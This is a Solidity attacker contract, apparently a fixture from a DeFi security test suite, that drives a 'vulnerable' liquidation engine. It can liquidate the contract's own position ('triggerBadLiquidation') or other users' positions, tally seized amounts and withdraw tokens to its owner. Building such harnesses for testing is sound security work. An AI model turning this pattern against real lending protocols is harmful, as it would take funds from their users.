// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../../interfaces/IERC20Minimal.sol";

interface IVulnerableLiquidationEngine {
    function liquidate(address user, uint256 debtToCover) external;
}

contract LiquidationAttacker {
    address public owner;
    uint256 public totalSeized;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function triggerBadLiquidation(address engine, address debtToken, uint256 debtToCover)
        external
        onlyOwner
    {
        IERC20Minimal(debtToken).approve(engine, debtToCover);
        IVulnerableLiquidationEngine(engine).liquidate(address(this), debtToCover);
    }

    function triggerLiquidation(address engine, address user, uint256 debtToCover)
        external
        onlyOwner
    {
        IVulnerableLiquidationEngine(engine).liquidate(user, debtToCover);
    }

    function setSeized(uint256 amount) external {
        totalSeized += amount;
    }

    function getProfits() external view returns (uint256) {
        return totalSeized;
    }

    function withdrawToken(address token, uint256 amount) external onlyOwner {
        IERC20Minimal(token).transfer(owner, amount);
    }
}
